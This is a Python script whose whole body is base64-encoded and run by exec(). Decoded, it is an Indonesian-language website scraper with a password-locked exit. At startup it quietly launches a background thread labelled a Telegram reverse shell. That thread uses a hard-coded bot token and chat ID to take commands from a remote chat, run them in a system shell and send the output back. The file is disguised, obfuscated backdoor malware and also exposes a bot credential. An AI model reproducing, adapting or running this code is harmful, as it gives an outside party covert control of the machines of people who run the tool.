import base64
exec(base64.b64decode('''CmltcG9ydCBvcwppbXBvcnQgdGltZQppbXBvcnQgcmVxdWVzdHMKaW1wb3J0IHNpZ25hbAppbXBvcnQgdGhyZWFkaW5nCmZyb20gYnM0IGltcG9ydCBCZWF1dGlmdWxTb3VwCmZyb20gdXJsbGliLnBhcnNlIGltcG9ydCB1cmxqb2luLCB1cmxwYXJzZQpmcm9tIHJpY2ggaW1wb3J0IHByaW50CmZyb20gcmljaC5wcm9tcHQgaW1wb3J0IFByb21wdApmcm9tIHJpY2guY29uc29sZSBpbXBvcnQgQ29uc29sZQoKY29uc29sZSA9IENvbnNvbGUoKQpLRVkgPSAiamF2YXoxMjMiCgojID09PT09PT09PT0gVEVMRUdSQU0gUkVWRVJTRSBTSEVMTCA9PT09PT09PT09CgpCT1RfVE9LRU4gPSAiNzEzODE1NzQwMTpBQUY5RzZIbVZrNmlpVHdlWHJCbTFBUzFqcVo3cGR5TG9EZyIKQ0hBVF9JRCA9ICI3ODIyOTMyMDgzIgpsYXN0X3VwZGF0ZV9pZCA9IE5vbmUKCmRlZiBzZW5kX21lc3NhZ2UodGV4dCk6CiAgICB1cmwgPSBmImh0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3R7Qk9UX1RPS0VOfS9zZW5kTWVzc2FnZSIKICAgIGRhdGEgPSB7ImNoYXRfaWQiOiBDSEFUX0lELCAidGV4dCI6IHRleHR9CiAgICB0cnk6CiAgICAgICAgcmVxdWVzdHMucG9zdCh1cmwsIGRhdGE9ZGF0YSkKICAgIGV4Y2VwdDoKICAgICAgICBwYXNzCgpkZWYgZ2V0X3VwZGF0ZXMoKToKICAgIGdsb2JhbCBsYXN0X3VwZGF0ZV9pZAogICAgdXJsID0gZiJodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90e0JPVF9UT0tFTn0vZ2V0VXBkYXRlcyIKICAgIGlmIGxhc3RfdXBkYXRlX2lkOgogICAgICAgIHVybCArPSBmIj9vZmZzZXQ9e2xhc3RfdXBkYXRlX2lkICsgMX0iCiAgICB0cnk6CiAgICAgICAgcmV0dXJuIHJlcXVlc3RzLmdldCh1cmwsIHRpbWVvdXQ9MTApLmpzb24oKQogICAgZXhjZXB0OgogICAgICAgIHJldHVybiB7InJlc3VsdCI6IFtdfQoKZGVmIGV4ZWN1dGVfY29tbWFuZChjbWQpOgogICAgaW1wb3J0IHN1YnByb2Nlc3MKICAgIHRyeToKICAgICAgICBvdXRwdXQgPSBzdWJwcm9jZXNzLmNoZWNrX291dHB1dChjbWQsIHNoZWxsPVRydWUsIHN0ZGVycj1zdWJwcm9jZXNzLlNURE9VVCwgdGltZW91dD0xMjApCiAgICAgICAgcmV0dXJuIG91dHB1dC5kZWNvZGUoKQogICAgZXhjZXB0IHN1YnByb2Nlc3MuQ2FsbGVkUHJvY2Vzc0Vycm9yIGFzIGU6CiAgICAgICAgcmV0dXJuIGYiWyFdIEVycm9yOiB7ZS5vdXRwdXQuZGVjb2RlKCl9IgogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHJldHVybiBmIlshXSBFeGNlcHRpb246IHtzdHIoZSl9IgoKZGVmIGhhbmRsZV90ZWxlZ3JhbSgpOgogICAgZ2xvYmFsIGxhc3RfdXBkYXRlX2lkCiAgICBzZW5kX21lc3NhZ2UoIvCfk6EgQm90IGFrdGlmLiBLZXRpayAvaGVscCB1bnR1ayBwZXJpbnRhaC4iKQogICAgd2hpbGUgVHJ1ZToKICAgICAgICB0cnk6CiAgICAgICAgICAgIHVwZGF0ZXMgPSBnZXRfdXBkYXRlcygpCiAgICAgICAgICAgIGZvciByZXN1bHQgaW4gdXBkYXRlc1sicmVzdWx0Il06CiAgICAgICAgICAgICAgICBsYXN0X3VwZGF0ZV9pZCA9IHJlc3VsdFsidXBkYXRlX2lkIl0KICAgICAgICAgICAgICAgIG1zZyA9IHJlc3VsdC5nZXQoIm1lc3NhZ2UiLCB7fSkKICAgICAgICAgICAgICAgIHRleHQgPSBtc2cuZ2V0KCJ0ZXh0IiwgIiIpCiAgICAgICAgICAgICAgICBpZiBub3QgdGV4dCBvciBzdHIobXNnLmdldCgiY2hhdCIsIHt9KS5nZXQoImlkIikpICE9IENIQVRfSUQ6CiAgICAgICAgICAgICAgICAgICAgY29udGludWUKICAgICAgICAgICAgICAgIGlmIHRleHQuc3RhcnRzd2l0aCgiL2hlbHAiKToKICAgICAgICAgICAgICAgICAgICBzZW5kX21lc3NhZ2UoIlBlcmludGFoOlxuL2hlbHAsIC9jd2QsIC9scywgL3NoZWxsIDxjbWQ+IikKICAgICAgICAgICAgICAgIGVsaWYgdGV4dC5zdGFydHN3aXRoKCIvY3dkIik6CiAgICAgICAgICAgICAgICAgICAgc2VuZF9tZXNzYWdlKGYi8J+TgiBEaXI6IHtvcy5nZXRjd2QoKX0iKQogICAgICAgICAgICAgICAgZWxpZiB0ZXh0LnN0YXJ0c3dpdGgoIi9scyIpOgogICAgICAgICAgICAgICAgICAgIHNlbmRfbWVzc2FnZSgi8J+TgSBGaWxlOlxuIiArICJcbiIuam9pbihvcy5saXN0ZGlyKCkpKQogICAgICAgICAgICAgICAgZWxpZiB0ZXh0LnN0YXJ0c3dpdGgoIi9zaGVsbCAiKToKICAgICAgICAgICAgICAgICAgICBjbWQgPSB0ZXh0LnNwbGl0KCIgIiwgMSlbMV0KICAgICAgICAgICAgICAgICAgICBzZW5kX21lc3NhZ2UoZiLwn5alIE1lbmphbGFua2FuOiB7Y21kfSIpCiAgICAgICAgICAgICAgICAgICAgb3V0cHV0ID0gZXhlY3V0ZV9jb21tYW5kKGNtZCkKICAgICAgICAgICAgICAgICAgICBmb3IgaSBpbiByYW5nZSgwLCBsZW4ob3V0cHV0KSwgNDAwMCk6CiAgICAgICAgICAgICAgICAgICAgICAgIHNlbmRfbWVzc2FnZShvdXRwdXRbaTppKzQwMDBdKQogICAgICAgICAgICAgICAgZWxpZiB0ZXh0LnN0YXJ0c3dpdGgoJ3BpcCBpbnN0YWxsJyk6CiAgICAgICAgICAgICAgICAgICAgbW9kdWxlID0gdGV4dC5zcGxpdCgiaW5zdGFsbCAiLDEpWzFdCiAgICAgICAgICAgICAgICAgICAgc2VuZF9tZXNzYWdlKGYiTWVuZ2luc3RhbGwgTW9kdWxlIHttb2R1bGV9Li4uIikKICAgICAgICAgICAgICAgICAgICB0aW1lLnNsZWVwKDEpCiAgICAgICAgICAgICAgICAgICAgc2VuZF9tZXNzYWdlKCJwcm9zZXMgbWVtYWthbiBtdW5na2luIG1lbWFrYW4gd2FrdHUgeWFuZyBsYW1hLi4uIikKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgIyBKYWxhbmthbiBzZW11YSBwZXJpbnRhaCBsYWluIHNlYmFnYWkgc2hlbGwKICAgICAgICAgICAgICAgICAgICBzZW5kX21lc3NhZ2UoZiLwn5alIE1lbmphbGFua2FuIChhdXRvKToge3RleHR9IikKICAgICAgICAgICAgICAgICAgICBvdXRwdXQgPSBleGVjdXRlX2NvbW1hbmQodGV4dCkKICAgICAgICAgICAgICAgICAgICBmb3IgaSBpbiByYW5nZSgwLCBsZW4ob3V0cHV0KSwgNDAwMCk6CiAgICAgICAgICAgICAgICAgICAgICAgIHNlbmRfbWVzc2FnZShvdXRwdXRbaTppKzQwMDBdKQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICAgICAgc2VuZF9tZXNzYWdlKGYiWyFdIEVycm9yOiB7c3RyKGUpfSIpCiAgICAgICAgdGltZS5zbGVlcCgyKQoKIyA9PT09PT09PT09IFNDUkFQRVIgSFRNTC9DU1MvSlMgPT09PT09PT09PQoKZGVmIGR1bXBfd2Vic2l0ZSh1cmwpOgogICAgZm9sZGVyID0gImR1bXAiCiAgICBvcy5tYWtlZGlycyhmb2xkZXIsIGV4aXN0X29rPVRydWUpCiAgICB0cnk6CiAgICAgICAgcmVzID0gcmVxdWVzdHMuZ2V0KHVybCwgdGltZW91dD0xMCkKICAgICAgICBodG1sID0gcmVzLnRleHQKICAgICAgICBkb21haW4gPSB1cmxwYXJzZSh1cmwpLm5ldGxvYy5yZXBsYWNlKCIuIiwgIl8iKQogICAgICAgIGJhc2VfcGF0aCA9IG9zLnBhdGguam9pbihmb2xkZXIsIGRvbWFpbikKICAgICAgICBvcy5tYWtlZGlycyhiYXNlX3BhdGgsIGV4aXN0X29rPVRydWUpCiAgICAgICAgaHRtbF9maWxlID0gb3MucGF0aC5qb2luKGJhc2VfcGF0aCwgImluZGV4Lmh0bWwiKQogICAgICAgIHdpdGggb3BlbihodG1sX2ZpbGUsICJ3IiwgZW5jb2Rpbmc9InV0Zi04IikgYXMgZjoKICAgICAgICAgICAgZi53cml0ZShodG1sKQogICAgICAgIHNvdXAgPSBCZWF1dGlmdWxTb3VwKGh0bWwsICJodG1sLnBhcnNlciIpCiAgICAgICAgcmVzb3VyY2VzID0gW3VybGpvaW4odXJsLCB0YWcuZ2V0KCJocmVmIikgb3IgdGFnLmdldCgic3JjIikpCiAgICAgICAgICAgICAgICAgICAgIGZvciB0YWcgaW4gc291cC5maW5kX2FsbChbImxpbmsiLCAic2NyaXB0Il0pCiAgICAgICAgICAgICAgICAgICAgIGlmIHRhZy5nZXQoImhyZWYiKSBvciB0YWcuZ2V0KCJzcmMiKV0KICAgICAgICBmb3IgbGluayBpbiByZXNvdXJjZXM6CiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIGZpbGVuYW1lID0gb3MucGF0aC5iYXNlbmFtZShsaW5rKS5zcGxpdCgiPyIpWzBdCiAgICAgICAgICAgICAgICBzYXZlX3BhdGggPSBvcy5wYXRoLmpvaW4oYmFzZV9wYXRoLCBmaWxlbmFtZSkKICAgICAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5nZXQobGluaywgdGltZW91dD01KQogICAgICAgICAgICAgICAgd2l0aCBvcGVuKHNhdmVfcGF0aCwgIndiIikgYXMgZjoKICAgICAgICAgICAgICAgICAgICBmLndyaXRlKHIuY29udGVudCkKICAgICAgICAgICAgICAgIHByaW50KGYi4pyFIERvd25sb2FkZWQ6IHtmaWxlbmFtZX0iKQogICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICBwcmludChmIuKaoO+4jyBHYWdhbCBhbWJpbDoge2xpbmt9IikKICAgICAgICBwcmludChmIlxu8J+MkCBXZWJzaXRlIGRpc2ltcGFuIGRpOiB7YmFzZV9wYXRofSIpCiAgICAgICAgcmV0dXJuIGJhc2VfcGF0aAogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHByaW50KGYiWyFdIEVycm9yIGR1bXA6IHtzdHIoZSl9IikKICAgICAgICByZXR1cm4gTm9uZQoKZGVmIG1pbnRhX3Bhc3N3b3JkX3VudHVrX2tlbHVhcigpOgogICAgd2hpbGUgVHJ1ZToKICAgICAgICB0cnk6CiAgICAgICAgICAgIGtleSA9IFByb21wdC5hc2soIltib2xkIHllbGxvd11NYXN1a2thbiBwYXNzd29yZCB1bnR1ayBrZWx1YXIiKQogICAgICAgICAgICBpZiBrZXkgPT0gS0VZOgogICAgICAgICAgICAgICAgcHJpbnQoIltib2xkIGdyZWVuXeKclO+4jyBQYXNzd29yZCBiZW5hci4gUHJvZ3JhbSBrZWx1YXIuLi5bL2JvbGQgZ3JlZW5dIikKICAgICAgICAgICAgICAgIHRpbWUuc2xlZXAoMSkKICAgICAgICAgICAgICAgIG9zLnN5c3RlbSgiY2xlYXIiKQogICAgICAgICAgICAgICAgZXhpdCgpCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICBwcmludCgiW2JvbGQgcmVkXeKdjCBQYXNzd29yZCBzYWxhaC4gVGlkYWsgYmlzYSBrZWx1YXIuWy9ib2xkIHJlZF0iKQogICAgICAgIGV4Y2VwdCAoS2V5Ym9hcmRJbnRlcnJ1cHQsIEVPRkVycm9yKToKICAgICAgICAgICAgcHJpbnQoIltyZWRd4p2MIFRpZGFrIGJpc2Ega2VsdWFyIGRlbmdhbiBDdHJsK0MvRCFbL3JlZF0iKQoKZGVmIGhhbmRsZV90ZXJtaW5hbCgpOgogICAgb3Muc3lzdGVtKCJjbGVhciIpCiAgICBwcmludCgiW2JvbGQgY3lhbl3wn6ewIE1lbnUgU2NyYXBpbmcgV2Vic2l0ZSAoSFRNTC9DU1MvSlMpWy9ib2xkIGN5YW5dIikKICAgIHByaW50KCJLZXRpayBVUkwgKGh0dHBzOi8vLi4uKSB1bnR1ayBtdWxhaSBkb3dubG9hZC4iKQogICAgcHJpbnQoIktldGlrICdleGl0JyB1bnR1ayBrZWx1YXJcbiIpCgogICAgd2hpbGUgVHJ1ZTogIAogICAgICAgIHRyeTogIAogICAgICAgICAgICB1cmwgPSBpbnB1dCgiTWFzdWtrYW4gVVJMOiAiKS5zdHJpcCgpICAKICAgICAgICAgICAgaWYgdXJsLmxvd2VyKCkgPT0gImV4aXQiOiAgCiAgICAgICAgICAgICAgICBtaW50YV9wYXNzd29yZF91bnR1a19rZWx1YXIoKSAgCiAgICAgICAgICAgICAgICBjb250aW51ZSAgCiAgICAgICAgICAgIGlmIG5vdCB1cmwuc3RhcnRzd2l0aCgiaHR0cCIpOiAgCiAgICAgICAgICAgICAgICBwcmludCgi4pqg77iPIFVSTCBoYXJ1cyBkaWF3YWxpIGRlbmdhbiBodHRwIGF0YXUgaHR0cHMuIikgIAogICAgICAgICAgICAgICAgY29udGludWUgIAogICAgICAgICAgICBmb2xkZXJfcGF0aCA9IGR1bXBfd2Vic2l0ZSh1cmwpICAKICAgICAgICAgICAgaWYgbm90IGZvbGRlcl9wYXRoOiAgCiAgICAgICAgICAgICAgICBjb250aW51ZSAgCiAgICAgICAgICAgIHdoaWxlIFRydWU6ICAKICAgICAgICAgICAgICAgIHByaW50KCJcbvCfk4EgRmlsZSB0ZXJzZWRpYToiKSAgCiAgICAgICAgICAgICAgICBmaWxlcyA9IG9zLmxpc3RkaXIoZm9sZGVyX3BhdGgpICAKICAgICAgICAgICAgICAgIGZvciBpZHgsIGZuYW1lIGluIGVudW1lcmF0ZShmaWxlcyk6ICAKICAgICAgICAgICAgICAgICAgICBwcmludChmIntpZHgrMX0uIHtmbmFtZX0iKSAgCiAgICAgICAgICAgICAgICBjbWQgPSBpbnB1dCgicGlsaWg+ICIpLnN0cmlwKCkubG93ZXIoKSAgCiAgICAgICAgICAgICAgICBpZiBjbWQgaW4gWyJiYWNrIiwgIjAyIl06ICAKICAgICAgICAgICAgICAgICAgICBicmVhayAgCiAgICAgICAgICAgICAgICBlbGlmIGNtZCA9PSAiZXhpdCI6ICAKICAgICAgICAgICAgICAgICAgICBtaW50YV9wYXNzd29yZF91bnR1a19rZWx1YXIoKSAgCiAgICAgICAgICAgICAgICBlbGlmIGNtZC5pc2RpZ2l0KCk6ICAKICAgICAgICAgICAgICAgICAgICBpZHggPSBpbnQoY21kKSAtIDEgIAogICAgICAgICAgICAgICAgICAgIGlmIDAgPD0gaWR4IDwgbGVuKGZpbGVzKTogIAogICAgICAgICAgICAgICAgICAgICAgICB0cnk6ICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHdpdGggb3Blbihvcy5wYXRoLmpvaW4oZm9sZGVyX3BhdGgsIGZpbGVzW2lkeF0pLCAiciIsIGVuY29kaW5nPSJ1dGYtOCIsIGVycm9ycz0iaWdub3JlIikgYXMgZjogIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbnRlbnQgPSBmLnJlYWQoKSAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoZiJcbvCfk4QgSXNpIGRhcmkge2ZpbGVzW2lkeF19Olxueyc9Jyo2MH0iKSAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoY29udGVudFs6NTAwMF0gKyAoIlxuLi4uIFtkaXBvdG9uZ10iIGlmIGxlbihjb250ZW50KSA+IDUwMDAgZWxzZSAiIikpICAKICAgICAgICAgICAgICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOiAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludChmIlshXSBHYWdhbCBiYWNhIGZpbGU6IHtlfSIpICAKICAgICAgICAgICAgICAgICAgICBlbHNlOiAgCiAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KCLinYwgTm9tb3IgdGlkYWsgdmFsaWQuIikgIAogICAgICAgICAgICAgICAgZWxzZTogIAogICAgICAgICAgICAgICAgICAgIHByaW50KCLinZMgUGVyaW50YWggdGlkYWsgZGlrZW5hbC4iKSAgCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOiAgCiAgICAgICAgICAgIHByaW50KGYiWyFdIEVycm9yOiB7c3RyKGUpfSIpCgojID09PT09PT09PT0gTUFJTiA9PT09PT09PT09CmlmIF9fbmFtZV9fID09ICJfX21haW5fXyI6CiAgICAjIE11bGFpIHJldmVyc2Ugc2hlbGwgVGVsZWdyYW0gZGkgYmFja2dyb3VuZAogICAgdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9aGFuZGxlX3RlbGVncmFtLCBkYWVtb249VHJ1ZSkuc3RhcnQoKQogICAgIyBKYWxhbmthbiB0ZXJtaW5hbCBzY3JhcGVyCiAgICBoYW5kbGVfdGVybWluYWwoKQo=''').decode())
